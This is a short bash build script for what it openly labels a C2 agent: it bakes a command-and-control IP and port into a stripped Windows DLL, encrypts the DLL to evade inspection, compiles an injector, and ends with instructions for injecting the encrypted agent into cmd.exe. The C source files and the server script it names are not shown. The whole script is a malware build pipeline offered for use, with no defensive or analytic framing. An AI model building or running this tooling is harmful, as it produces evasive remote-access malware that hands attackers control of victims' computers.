#!/bin/bash
IP="${1:-192.168.102.167}"; PORT="${2:-4444}"
IPHEX=$(python3 -c "import socket,struct;print(hex(struct.unpack('<I',socket.inet_aton('$IP'))[0]))" 2>/dev/null || python -c "import socket,struct;print(hex(struct.unpack('<I',socket.inet_aton('$IP'))[0]))")
echo "C2: $IP:$PORT ($IPHEX)"
GCC="${GCC:-gcc}"
$GCC -O2 -s -m64 -shared -fno-ident -DC2_IP=$IPHEX -DC2_PORT=$PORT -o agent.dll agent.c -lws2_32 || exit 1
echo "[1/4] agent.dll"
$GCC -O2 -s -m64 -fno-ident -o encrypt.exe encrypt.c || exit 1
echo "[2/4] encrypt.exe"
./encrypt.exe agent.dll
echo "[3/4] agent.dll.enc"
$GCC -O2 -s -m64 -fno-ident -o injector_enc.exe injector_enc.c || exit 1
echo "[4/4] injector_enc.exe"
echo "Done! Use: injector_enc.exe agent.dll.enc cmd.exe"
ls -la agent.dll.enc injector_enc.exe c2_server.py
